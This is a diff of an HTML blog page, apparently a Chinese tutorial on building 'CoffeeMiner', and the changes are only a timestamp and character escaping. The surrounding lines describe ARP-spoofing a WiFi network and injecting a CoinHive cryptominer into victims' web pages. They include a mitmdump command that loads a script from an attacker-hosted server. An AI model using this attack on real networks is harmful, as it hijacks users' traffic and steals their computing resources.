@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://thinkalone.win/pictures/CoffeeMiner/11.png">
 <meta property="og:image" content="https://thinkalone.win/pictures/CoffeeMiner/12.gif">
 <meta property="article:published_time" content="2018-01-31T13:25:20.000Z">
-<meta property="article:modified_time" content="2025-03-04T09:08:40.221Z">
+<meta property="article:modified_time" content="2025-03-04T09:36:12.642Z">
 <meta property="article:author" content="Disappear9">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="教程">
@@ -262,22 +262,22 @@
 <blockquote>
 <p>受害者：接入了WIFI路由器并浏览了某些恶意页面<br>测试者：运行CoffeeMiner工具，发起MITM测试</p>
 </blockquote>
-<p><strong>路由/网关设备：起到普通网关作用</strong></p>
+<p><strong>路由&#x2F;网关设备：起到普通网关作用</strong></p>
 <p><img src="/pictures/CoffeeMiner/2.png"></p>
 <p><strong>一旦发起测试，实际场景应该是这样的，即受害者的网络流量要被劫持：</strong></p>
 <p><img src="/pictures/CoffeeMiner/3.png"></p>
 <p>我们分别对3台虚拟机进行以下配置：</p>
 <p><strong>受害者</strong><br>网络适配器：</p>
 <blockquote>
-<p>eth0: Host-only Adapter<br>/etc/network/interfaces:<br> <img src="/pictures/CoffeeMiner/4.png"></p>
+<p>eth0: Host-only Adapter<br>&#x2F;etc&#x2F;network&#x2F;interfaces:<br> <img src="/pictures/CoffeeMiner/4.png"></p>
 </blockquote>
 <p><strong>测试者</strong><br>网络适配器：</p>
 <blockquote>
-<p>eth0: Host-only Adapter<br>/etc/network/interfaces:<br><img src="/pictures/CoffeeMiner/5.png"></p>
+<p>eth0: Host-only Adapter<br>&#x2F;etc&#x2F;network&#x2F;interfaces:<br><img src="/pictures/CoffeeMiner/5.png"></p>
 </blockquote>
-<p><strong>路由/网关设备</strong><br>网络适配器：</p>
+<p><strong>路由&#x2F;网关设备</strong><br>网络适配器：</p>
 <blockquote>
-<p>eth0: Bridged Adapter<br>eth1: Host-only Adapter<br>/etc/network/interfaces:<br><img src="/pictures/CoffeeMiner/6.png"></p>
+<p>eth0: Bridged Adapter<br>eth1: Host-only Adapter<br>&#x2F;etc&#x2F;network&#x2F;interfaces:<br><img src="/pictures/CoffeeMiner/6.png"></p>
 </blockquote>
 <h1 id="编写CoffeeMiner代码"><a href="#编写CoffeeMiner代码" class="headerlink" title="编写CoffeeMiner代码"></a>编写CoffeeMiner代码</h1><p><strong>ARP spoofing功能模块</strong><br>在这里，我们采用ARP spoofing来实现中间人MITM测试：</p>
 <blockquote>
@@ -326,7 +326,7 @@ httpd = socketserver.TCPServer((&quot;&quot;, PORT), Handler)
 print(&quot;serving at port&quot;, PORT)
 httpd.serve_forever()
 </code></pre>
-<p>上面的代码就是一个托管挖矿服务的简单HTTP服务器，其中托管脚本会被放置在/miner_script目录下，为了实现真正的挖矿，我在此使用了CoinHive的JavaScript挖矿平台工具。</p>
+<p>上面的代码就是一个托管挖矿服务的简单HTTP服务器，其中托管脚本会被放置在&#x2F;miner_script目录下，为了实现真正的挖矿，我在此使用了CoinHive的JavaScript挖矿平台工具。</p>
 <p><strong>CoinHive挖矿工具</strong><br>Coinhive其实是一个门罗币挖矿工具，它可以嵌入被测试者控制的肉鸡网站上，每当用户访问该网站时，用户CPU资源就会被占用，用来计算CryptoNote协议相关的加密货币哈希值，用户电脑也就间接沦为了测试者的“矿工”。</p>
 <p>Coinhive挖矿工具的执行，要在受害者打开页面40秒后才能开始，所以，如果受害者浏览页面时间不足40秒，Coinhive的挖矿任务失效。本例中，我会在受害者请求的每个html页面中注入挖矿脚本，所以时间上肯定足够。<br><img src="/pictures/CoffeeMiner/8.jpg"></p>
 <h2 id="CoffeeMiner代码组合"><a href="#CoffeeMiner代码组合" class="headerlink" title="CoffeeMiner代码组合"></a>CoffeeMiner代码组合</h2><p>等所有条件准备好之后，我们就可以在某个WIFI环境中进行隐蔽部署了，现在我们来看看CoffeeMiner的实现。<br>CoffeeMiner脚本会执行ARP欺骗，并能用mitmproxy将CoinHive 挖矿程序注入受害者请求的html页面中。<br>首先，为了把测试者主机转化为中间代理，需要对ip_forwarding和IPTABLES进行配置：</p>
@@ -350,7 +350,7 @@ for victim in victims:
 </blockquote>
 <p>之后，就可利用mitmproxy来执行注入程序 injector.py：</p>
 <blockquote>
-<p>mitmdump -s ‘injector.py <a target="_blank" rel="noopener" href="http://httpserverip:8000/script.js&#39;">http://httpserverIP:8000/script.js&#39;</a></p>
+<p>mitmdump -s ‘injector.py <a target="_blank" rel="noopener" href="http://httpserverip:8000/script.js">http://httpserverIP:8000/script.js</a>‘</p>
 </blockquote>
 <h2 id="最终脚本"><a href="#最终脚本" class="headerlink" title="最终脚本"></a>最终脚本</h2><p><strong>coffeeMiner.py：</strong></p>
 <pre><code>import os
